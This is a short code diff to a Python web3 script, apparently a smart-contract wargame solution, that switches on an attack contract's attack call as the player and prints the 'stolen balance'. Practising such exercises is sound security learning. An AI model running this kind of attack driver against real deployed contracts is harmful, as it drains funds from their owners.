@@ -23,6 +23,5 @@ def main():
     balance_ether = web3.fromWei(target.balance(), "ether")
     print(f"\nBalance of the attack contract = {balance_ether}\n")
 
-    # attack.attack({"from": player})
-
-    # print(f"Final balance = {attack.balance()}")
+    attack.attack({"from": player, "gas_limit": 600000})
+    print(f"Stolen balance = {attack.balance()}")
